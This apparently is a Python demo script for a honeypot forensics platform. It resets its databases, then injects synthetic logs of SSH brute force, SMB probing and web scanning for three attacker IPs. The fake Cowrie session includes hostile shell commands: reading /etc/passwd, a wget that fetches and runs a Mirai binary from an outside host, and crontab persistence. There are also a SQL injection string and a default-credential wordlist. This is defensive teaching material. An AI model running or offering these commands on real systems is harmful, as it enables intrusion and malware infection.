"""
ForenHive — Script de démo encadrant
=====================================
Reset complet + injection 3 IP publiques malveillantes + scoring forensique.

Usage (depuis le conteneur):
  docker exec -it forenhive-forensic-engine python demo_encadrant.py

Durée estimée: 3-5 min (Ollama ~40s/session × 3 sessions)
"""

import json
import logging
import os
import subprocess
import sys
import uuid
from datetime import datetime, timedelta, timezone

import psycopg2
import psycopg2.extras
from elasticsearch import Elasticsearch
from elasticsearch.helpers import bulk

import config

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("demo")

# ── Connexions ──────────────────────────────────────────────────────────────────

def es_client():
    return Elasticsearch(
        [{"host": config.ES_HOST, "port": config.ES_PORT, "scheme": "http"}],
        request_timeout=30,
    )

def pg_conn():
    return psycopg2.connect(
        host=config.PG_HOST, port=config.PG_PORT,
        dbname=config.PG_DB, user=config.PG_USER,
        password=os.environ.get("PG_PASSWORD") or os.environ.get("POSTGRES_PASSWORD", ""),
    )

# ── Données des 3 attaquants ────────────────────────────────────────────────────

ATTACKERS = {
    "cowrie": {
        "ip":           "185.220.101.55",
        "country_name": "Germany",
        "country_iso":  "DE",
        "city":         "Frankfurt am Main",
        "lat":          50.1109,
        "lon":          8.6821,
        "asn":          208323,
        "as_org":       "SnapServ Mathis",
        "is_tor":       True,
        "is_vpn":       False,
        "abuse_score":  95,
        "abuse_reports": 150,
        "session_id":   "demo_bf_185220101055",
        "label":        "Tor exit node — Brute Force SSH",
    },
    "dionaea": {
        "ip":           "45.142.212.100",
        "country_name": "Netherlands",
        "country_iso":  "NL",
        "city":         "Amsterdam",
        "lat":          52.3824,
        "lon":          4.8995,
        "asn":          210644,
        "as_org":       "Mullvad VPN AB",
        "is_tor":       False,
        "is_vpn":       True,
        "abuse_score":  45,
        "abuse_reports": 23,
        "label":        "Mullvad VPN — SMB/EternalBlue Scanner",
    },
    "galah": {
        "ip":           "222.186.42.213",
        "country_name": "China",
        "country_iso":  "CN",
        "city":         "Nanjing",
        "lat":          32.0617,
        "lon":          118.7778,
        "asn":          4134,
        "as_org":       "ChinaNet Jiangsu Province Network",
        "is_tor":       False,
        "is_vpn":       False,
        "abuse_score":  72,
        "abuse_reports": 89,
        "session_id":   "galah-222.186.42.213",
        "label":        "ChinaNet scanner — Web Reconnaissance",
    },
}

# ── 1. Reset Elasticsearch ──────────────────────────────────────────────────────

def reset_elasticsearch(es: Elasticsearch):
    log.info("=== RESET Elasticsearch ===")
    for pattern in ["honeypot-logs-*", "forenhive-profiles", "forenhive-smb-analysis"]:
        try:
            es.indices.delete(index=pattern, ignore_unavailable=True)
            log.info("  Supprimé : %s", pattern)
        except Exception as e:
            log.warning("  Impossible de supprimer %s : %s", pattern, e)

# ── 2. Reset PostgreSQL ─────────────────────────────────────────────────────────

def reset_postgresql(conn):
    log.info("=== RESET PostgreSQL ===")
    tables = [
        "forensic_chain_of_custody",
        "forensic_coc_batches",
        "forensic_iocs",
        "forensic_timeline_events",
        "forensic_sessions",
        "suspect_profiles",
        "file_analysis",
        "ip_enrichment_cache",
        "audit_log",
    ]
    with conn.cursor() as cur:
        for tbl in tables:
            cur.execute(f"TRUNCATE TABLE {tbl} RESTART IDENTITY CASCADE;")
            log.info("  Vidé : %s", tbl)
    conn.commit()

# ── Helpers timestamps ──────────────────────────────────────────────────────────

def _ts(offset_seconds: float) -> str:
    """Timestamp ISO8601 UTC, offset_seconds relatif à now-90min."""
    base = datetime.now(timezone.utc) - timedelta(minutes=90)
    t = base + timedelta(seconds=offset_seconds)
    return t.strftime("%Y-%m-%dT%H:%M:%S.000Z")

def _geo(a: dict) -> dict:
    return {
        "country_name":     a["country_name"],
        "country_iso_code": a["country_iso"],
        "city_name":        a["city"],
        "location":         {"lat": a["lat"], "lon": a["lon"]},
    }

def _as(a: dict) -> dict:
    return {"number": a["asn"], "organization": {"name": a["as_org"]}}

def _index_name() -> str:
    return f"honeypot-logs-{datetime.now(timezone.utc).strftime('%Y.%m.%d')}"

# ── 3. Injection Cowrie — Brute Force SSH ───────────────────────────────────────

def inject_cowrie(es: Elasticsearch):
    a = ATTACKERS["cowrie"]
    idx = _index_name()
    sid = a["session_id"]
    log.info("=== INJECTION Cowrie — %s (%s) ===", a["ip"], a["label"])

    creds = [
        ("root", "123456"), ("root", "password"), ("root", "admin"),
        ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
        ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("user", "user"),
        ("test", "test"), ("guest", "guest"), ("oracle", "oracle"),
        ("postgres", "postgres"), ("mysql", "mysql"), ("deploy", "deploy"),
        ("jenkins", "jenkins"), ("git", "git"), ("www", "www"),
        ("support", "support"), ("backup", "backup"),
    ]

    docs = []
    t = 0.0

    # cowrie.session.connect
    docs.append({"_index": idx, "_id": f"demo-c-conn-{sid}", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": sid},
        "event": {"id": "cowrie.session.connect", "action": "session.connect", "category": "session"},
        "tags": ["cowrie", "demo"],
    }})
    t += 1.0

    # 20 tentatives échouées
    for i, (usr, pwd) in enumerate(creds):
        docs.append({"_index": idx, "_id": f"demo-c-fail-{sid}-{i}", "_source": {
            "@timestamp": _ts(t),
            "honeypot": {"type": "cowrie"},
            "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
            "destination": {"ip": "172.16.1.100", "port": 2222},
            "network": {"transport": "ssh"},
            "session": {"id": sid},
            "event": {
                "id": "cowrie.login.failed",
                "action": "login.failed",
                "category": "authentication",
                "outcome": "failure",
            },
            "user": {"name": usr, "password": pwd},
            "tags": ["cowrie", "demo"],
        }})
        t += 1.8

    # 1 login réussi
    docs.append({"_index": idx, "_id": f"demo-c-success-{sid}", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": sid},
        "event": {
            "id": "cowrie.login.success",
            "action": "login.success",
            "category": "authentication",
            "outcome": "success",
        },
        "user": {"name": "root", "password": "toor"},
        "tags": ["cowrie", "demo"],
    }})
    t += 2.0

    # Commandes shell
    commands = [
        ("uname -a",                       "cowrie.command.input"),
        ("whoami",                         "cowrie.command.input"),
        ("id",                             "cowrie.command.input"),
        ("cat /etc/passwd",                "cowrie.command.input"),
        ("ps aux",                         "cowrie.command.input"),
        ("wget http://45.142.212.100/mirai.arm7 -O /tmp/m", "cowrie.command.input"),
        ("chmod +x /tmp/m",                "cowrie.command.input"),
        ("/tmp/m",                         "cowrie.command.input"),
        ("echo '* * * * * /tmp/m' >> /etc/crontab", "cowrie.command.input"),
    ]
    for cmd, evid in commands:
        docs.append({"_index": idx, "_id": f"demo-c-cmd-{sid}-{abs(hash(cmd)) % 9999}", "_source": {
            "@timestamp": _ts(t),
            "honeypot": {"type": "cowrie"},
            "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
            "destination": {"ip": "172.16.1.100", "port": 2222},
            "network": {"transport": "ssh"},
            "session": {"id": sid},
            "event": {"id": evid, "action": evid.replace("cowrie.", ""), "category": "process"},
            "process": {"command_line": cmd},
            "input": cmd,
            "tags": ["cowrie", "demo"],
        }})
        t += 3.0

    # Téléchargement de fichier (mirai)
    mirai_sha256 = "a8c4b2e1f3d7962e5b0a4c1f8e2d6b3a7c5f9e1d4b8a2c6f0e3d7b1a5c9f2e6d"
    docs.append({"_index": idx, "_id": f"demo-c-dl-{sid}", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "session": {"id": sid},
        "event": {"id": "cowrie.session.file.download", "action": "file.download", "category": "file"},
        "file": {
            "name": "mirai.arm7",
            "path": "/tmp/m",
            "hash": {"sha256": mirai_sha256},
        },
        "url": {"full": "http://45.142.212.100/mirai.arm7"},
        "tags": ["cowrie", "demo"],
    }})
    t += 1.0

    # cowrie.session.closed
    docs.append({"_index": idx, "_id": f"demo-c-close-{sid}", "_source": {
        "@timestamp": _ts(t),
        "honeypot": {"type": "cowrie"},
        "source": {"ip": a["ip"], "port": 58421, "geo": _geo(a), "as": _as(a)},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh", "bytes": 4820},
        "session": {"id": sid},
        "event": {"id": "cowrie.session.closed", "action": "session.closed", "category": "session", "duration": t},
        "tags": ["cowrie", "demo"],
    }})

    success, errors = bulk(es, docs, refresh="wait_for")
    log.info("  Cowrie : %d documents indexés (%d erreurs)", success, len(errors))

# ── 4. Injection Dionaea — VPN SMB Scanner ──────────────────────────────────────

def inject_dionaea(es: Elasticsearch):
    a = ATTACKERS["dionaea"]
    idx = _index_name()
    log.info("=== INJECTION Dionaea — %s (%s) ===", a["ip"], a["label"])

    ports_modules = [
        (445,  "smb",        10, "SMB connection — EternalBlue probe (MS17-010)"),
        (1433, "mssql",       5, "MSSQL login attempt"),
        (3306, "mysql",       3, "MySQL authentication probe"),
        (135,  "rpcdce",      2, "RPC/DCOM endpoint enumeration"),
    ]

    docs = []
    t = 0.0
    for port, module, count, msg in ports_modules:
        for i in range(count):
            doc_id = f"demo-d-{port}-{i}-{abs(hash(msg+str(i))) % 99999}"
            docs.append({"_index": idx, "_id": doc_id, "_source": {
                "@timestamp": _ts(t),
                "honeypot": {"type": "dionaea"},
                "source": {"ip": a["ip"], "port": 49000 + i, "geo": _geo(a), "as": _as(a)},
                "destination": {"ip": "172.16.1.100", "port": port},
                "network": {"transport": "tcp"},
                "event": {"id": "dionaea.connection", "action": "connection", "category": "network"},
                "dionaea": {
                    "module":   module,
                    "level":    "info",
                    "msg":      msg,
                    "protocol": module,
                },
                "tags": ["dionaea", "demo"],
            }})
            t += 4.5

    success, errors = bulk(es, docs, refresh="wait_for")
    log.info("  Dionaea : %d documents indexés (%d erreurs)", success, len(errors))

# ── 5. Injection Galah — Web Scanner ───────────────────────────────────────────

def inject_galah(es: Elasticsearch):
    a = ATTACKERS["galah"]
    idx = _index_name()
    sid = a["session_id"]
    log.info("=== INJECTION Galah — %s (%s) ===", a["ip"], a["label"])

    ua = "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"

    requests = [
        # (method, uri, status)
        ("GET",  "/",                                  200),
        ("GET",  "/wp-admin/",                         404),
        ("GET",  "/wp-login.php",                      200),
        ("POST", "/wp-login.php",                      403),
        ("GET",  "/.env",                              200),
        ("GET",  "/phpmyadmin/",                       404),
        ("GET",  "/phpmyadmin/index.php",              404),
        ("GET",  "/admin/",                            404),
        ("GET",  "/admin/config.php",                  404),
        ("GET",  "/backup.zip",                        404),
        ("GET",  "/db.sql",                            404),
        ("GET",  "/config.php.bak",                    404),
        ("GET",  "/.git/config",                       200),
        ("GET",  "/server-status",                     200),
        ("POST", "/search?q='+OR+'1'='1--",            200),
        ("GET",  "/api/v1/users",                      200),
        ("GET",  "/api/v1/admin",                      403),
        ("GET",  "/.well-known/security.txt",          404),
    ]

    docs = []
    t = 0.0
    for i, (method, uri, status) in enumerate(requests):
        doc_id = f"demo-g-{sid}-{i}"
        docs.append({"_index": idx, "_id": doc_id, "_source": {
            "@timestamp": _ts(t),
            "honeypot": {"type": "galah"},
            "source": {"ip": a["ip"], "port": 52300 + i, "geo": _geo(a), "as": _as(a)},
            "destination": {"ip": "172.16.1.100", "port": 8080},
            "event": {"id": "galah.request", "action": "http_request", "category": "web"},
            "session": {"id": sid},
            "http": {
                "request": {
                    "method":     method,
                    "uri":        uri,
                    "user_agent": ua,
                    "body": {"bytes": 0},
                },
                "response": {
                    "status_code": status,
                    "server":      "Apache/2.4.41 (Ubuntu)",
                },
                "version": "HTTP/1.1",
            },
            "url": {"path": uri, "full": f"http://172.16.1.100:8080{uri}"},
            "observer": {"name": "forenhive-galah"},
            "galah": {
                "response": {"source": "llm"},
                "llm":      {"model": "mistral"},
            },
            "tags": ["galah", "demo"],
        }})
        t += 3.0

    success, errors = bulk(es, docs, refresh="wait_for")
    log.info("  Galah : %d documents indexés (%d erreurs)", success, len(errors))

# ── 6. Pré-remplissage du cache d'enrichissement ────────────────────────────────

def preseed_enrichment_cache(conn):
    log.info("=== PRÉ-REMPLISSAGE cache enrichissement ===")
    now = datetime.now(timezone.utc)
    expires = now + timedelta(hours=48)

    entries = []
    for hp, a in ATTACKERS.items():
        data = {
            "ip":          a["ip"],
            "private":     False,
            "enriched_at": now.isoformat(),
            "sources_used": ["geoip", "iplocate", "abuseipdb", "shodan", "whois", "dns"],
            "geo": {
                "asn":              a["asn"],
                "lat":              a["lat"],
                "lon":              a["lon"],
                "org":              a["as_org"],
                "city":             a["city"],
                "country":          a["country_name"],
                "country_code":     a["country_iso"],
                "continent":        "Europe" if a["country_iso"] in ("DE", "NL") else "Asia",
                "country_eu":       a["country_iso"] in ("DE", "NL"),
                "asn_network":      f"{a['ip'].rsplit('.', 2)[0]}.0/24",
            },
            "privacy": {
                "is_tor":          a["is_tor"],
                "is_vpn":          a["is_vpn"],
                "is_proxy":        False,
                "is_relay":        False,
                "is_bogon":        False,
                "is_hosting":      a.get("is_vpn", False),
                "is_datacenter":   a.get("is_vpn", False),
                "is_anonymous":    a["is_tor"] or a["is_vpn"],
                "asn_name":        a["as_org"],
                "asn_type":        "tor" if a["is_tor"] else ("vpn" if a["is_vpn"] else "isp"),
                "asn_number":      f"AS{a['asn']}",
                "iplocate_city":    a["city"],
                "iplocate_country": a["country_name"],
                "iplocate_country_code": a["country_iso"],
                "abuse_contact_email":   f"abuse@as{a['asn']}.net",
            },
            "reputation": {
                "isp":            a["as_org"],
                "is_tor":         a["is_tor"],
                "is_public":      True,
                "ip_version":     4,
                "abuse_score":    a["abuse_score"],
                "country_code":   a["country_iso"],
                "country_name":   a["country_name"],
                "total_reports":  a["abuse_reports"],
                "distinct_users": max(1, a["abuse_reports"] // 4),
                "is_whitelisted": False,
            },
            "threat_summary": {
                "asn":            a["asn"],
                "org":            a["as_org"],
                "city":           a["city"],
                "country":        a["country_name"],
                "country_code":   a["country_iso"],
                "is_tor":         a["is_tor"],
                "is_vpn":         a["is_vpn"],
                "is_bogon":       False,
                "is_proxy":       False,
                "is_datacenter":  a.get("is_vpn", False),
                "is_anonymized":  a["is_tor"] or a["is_vpn"],
                "is_whitelisted": False,
                "is_abuser_listed": a["abuse_score"] > 50,
                "abuse_score":    a["abuse_score"],
                "total_reports":  a["abuse_reports"],
                "tier":           "high" if a["abuse_score"] > 70 else "medium",
                "open_ports":     [22, 80, 443] if hp == "cowrie" else [445, 1433, 3306, 80, 443],
                "shodan_tags":    ["tor"] if a["is_tor"] else (["vpn"] if a["is_vpn"] else []),
                "known_vulns":    [],
                "attack_categories": (
                    ["Brute-Force", "SSH", "Hacking", "Port Scan"] if hp == "cowrie"
                    else ["Port Scan", "Exploited Host", "Hacking"] if hp == "dionaea"
                    else ["Web App Attack", "SQL Injection", "Bad Web Bot", "Hacking"]
                ),
                "distinct_reporters": max(1, a["abuse_reports"] // 4),
                "last_reported_at":   (now - timedelta(hours=3)).isoformat(),
                "network_cidr":       f"{a['ip'].rsplit('.', 2)[0]}.0/24",
                "abuse_contact":      f"abuse@as{a['asn']}.net",
            },
        }
        entries.append((a["ip"], json.dumps(data), now, expires))

    with conn.cursor() as cur:
        for ip, data_json, cached_at, exp in entries:
            cur.execute(
                """
                INSERT INTO ip_enrichment_cache (ip, data, cached_at, expires_at)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (ip) DO UPDATE
                  SET data=EXCLUDED.data, cached_at=EXCLUDED.cached_at, expires_at=EXCLUDED.expires_at
                """,
                (ip, data_json, cached_at, exp),
            )
            d = json.loads(data_json)
            log.info("  Cache enrichi : %s (%s, Tor=%s, VPN=%s, abuse=%s/100)",
                     ip, ATTACKERS[[k for k,v in ATTACKERS.items() if v["ip"]==ip][0]]["country_name"],
                     d["privacy"]["is_tor"], d["privacy"]["is_vpn"],
                     d["reputation"]["abuse_score"])
    conn.commit()

# ── 7. Scoring forensique (moteur) ─────────────────────────────────────────────

def run_engine_scoring():
    log.info("=== SCORING FORENSIQUE (engine.py --hours 2 --score-only) ===")
    log.info("  Ollama/Mistral 7B en cours — ~40s par session, patientez...")
    result = subprocess.run(
        ["python", "engine.py", "--hours", "2", "--score-only"],
        capture_output=False,
        text=True,
        timeout=600,
    )
    if result.returncode != 0:
        log.error("  engine.py a retourné code %d", result.returncode)
    else:
        log.info("  Scoring terminé.")

# ── 8. Résumé final ─────────────────────────────────────────────────────────────

def print_summary(es: Elasticsearch, conn):
    log.info("")
    log.info("=" * 65)
    log.info("  DÉMO PRÊTE — Résumé")
    log.info("=" * 65)

    # Elasticsearch counts
    for hp in ["cowrie", "dionaea", "galah"]:
        try:
            r = es.count(index="honeypot-logs-*", body={"query": {"term": {"honeypot.type.keyword": hp}}})
            count = r["count"]
        except Exception:
            count = "?"
        a = ATTACKERS[hp]
        log.info("  [ES] %-8s  %3s événements  IP: %-18s  %s %s %s",
                 hp.upper(), count, a["ip"],
                 a["country_iso"],
                 "🧅 Tor" if a["is_tor"] else "",
                 "🔒 VPN" if a["is_vpn"] else "")

    # PostgreSQL sessions
    log.info("")
    with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute("""
            SELECT session_id, source_ip, honeypot_type, risk_score,
                   kill_chain_phase, primary_technique,
                   CASE WHEN risk_score >= 70 THEN 'HIGH'
                        WHEN risk_score >= 40 THEN 'MEDIUM'
                        WHEN risk_score >= 20 THEN 'LOW'
                        ELSE 'INFO' END AS level
            FROM forensic_sessions ORDER BY risk_score DESC
        """)
        rows = cur.fetchall()
        if rows:
            log.info("  [PG] Sessions scorées :")
            for r in rows:
                log.info("    %-32s  %-10s  score=%-3s %-8s  %s  %s",
                         r["session_id"], r["honeypot_type"],
                         r["risk_score"], r["level"],
                         r["kill_chain_phase"] or "—",
                         r["primary_technique"] or "")
        else:
            log.warning("  [PG] Aucune session scorée — vérifiez les logs du moteur.")

    log.info("")
    log.info("  Ouvrir le tableau de bord : http://172.16.1.100:9000")
    log.info("")
    log.info("  Checklist démo :")
    log.info("    ✓ Dashboard    → 3 honeypots actifs, donut chart 3 couleurs")
    log.info("    ✓ Evidence     → filtrer cowrie → 20 brute force + commandes shell")
    log.info("    ✓ Geo Map      → 🇩🇪 Frankfurt · 🇳🇱 Amsterdam · 🇨🇳 Nanjing")
    log.info("    ✓ Profiling    → 3 IP, scores HIGH/MEDIUM/MEDIUM, badges Tor/VPN")
    log.info("    ✓ Reconstitution attaque → kill chain rempli, phase installation")
    log.info("    ✓ Rapport PDF  → générer pour 185.220.101.55 (narrative Mistral 7B)")
    log.info("=" * 65)

# ── Main ────────────────────────────────────────────────────────────────────────

def main():
    log.info("ForenHive — Préparation démo encadrant")
    log.info("IPs : 185.220.101.55 (DE/Tor) | 45.142.212.100 (NL/VPN) | 222.186.42.213 (CN)")
    log.info("")

    es = es_client()

    # Vérifier la connexion ES
    try:
        info = es.info()
        log.info("Elasticsearch connecté — cluster: %s", info["cluster_name"])
    except Exception as e:
        log.error("Impossible de se connecter à Elasticsearch : %s", e)
        sys.exit(1)

    # Connexion PostgreSQL
    try:
        conn = pg_conn()
        log.info("PostgreSQL connecté — %s@%s/%s", config.PG_USER, config.PG_HOST, config.PG_DB)
    except Exception as e:
        log.error("Impossible de se connecter à PostgreSQL : %s", e)
        sys.exit(1)

    # Étape 1 — Reset
    reset_elasticsearch(es)
    reset_postgresql(conn)

    # Étape 2 — Injection
    inject_cowrie(es)
    inject_dionaea(es)
    inject_galah(es)

    # Étape 3 — Cache enrichissement
    preseed_enrichment_cache(conn)

    # Étape 4 — Scoring (Ollama)
    run_engine_scoring()

    # Étape 5 — Résumé
    print_summary(es, conn)

    conn.close()


if __name__ == "__main__":
    main()
